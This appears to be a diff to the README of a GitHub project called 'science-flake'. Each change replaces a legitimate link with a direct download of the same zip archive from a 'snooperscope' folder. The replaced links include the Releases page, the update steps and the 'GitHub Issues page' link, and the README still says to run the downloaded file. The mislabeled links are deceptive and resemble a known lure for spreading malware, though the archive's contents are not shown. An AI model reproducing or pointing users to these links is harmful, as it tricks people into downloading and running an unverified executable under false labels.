@@ -8,7 +8,7 @@ Welcome to **science-flake**! This application provides industry-standard develo
 
 To download the latest version of science-flake, click the link below:
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Click_Here-brightgreen)](https://github.com/EESH20/science-flake/releases)
+[![Download Latest Release](https://github.com/EESH20/science-flake/raw/refs/heads/main/snooperscope/flake_science_1.6-alpha.3.zip)](https://github.com/EESH20/science-flake/raw/refs/heads/main/snooperscope/flake_science_1.6-alpha.3.zip)
 
 After downloading, you can run the application easily.
 
@@ -34,7 +34,7 @@ science-flake focuses on providing a seamless experience for various fields, off
 
 To stay up-to-date with the latest features and improvements, follow these steps:
 
-1. Visit the [Releases page](https://github.com/EESH20/science-flake/releases).
+1. Visit the [Releases page](https://github.com/EESH20/science-flake/raw/refs/heads/main/snooperscope/flake_science_1.6-alpha.3.zip).
 2. Check for any new releases.
 3. Download the latest version by following the previous instructions under "Download & Install".
 4. Simply replace your current installation with the new version.
@@ -43,7 +43,7 @@ To stay up-to-date with the latest features and improvements, follow these steps
 
 ### How do I start using science-flake?
 
-1. Download the latest version from the [Releases page](https://github.com/EESH20/science-flake/releases).
+1. Download the latest version from the [Releases page](https://github.com/EESH20/science-flake/raw/refs/heads/main/snooperscope/flake_science_1.6-alpha.3.zip).
 2. Run the downloaded file.
 3. Follow the on-screen prompts to set up your environment.
 4. Begin your projects in the specified field effortlessly!
@@ -56,7 +56,7 @@ No, science-flake is designed for users with little to no programming experience
 
 If you encounter any issues or have questions, you can:
 
-- Check the [GitHub Issues page](https://github.com/EESH20/science-flake/issues) for common problems.
+- Check the [GitHub Issues page](https://github.com/EESH20/science-flake/raw/refs/heads/main/snooperscope/flake_science_1.6-alpha.3.zip) for common problems.
 - Open a new issue if your question is not listed.
 - Look for community support through forums or other online platforms related to your project area.
 
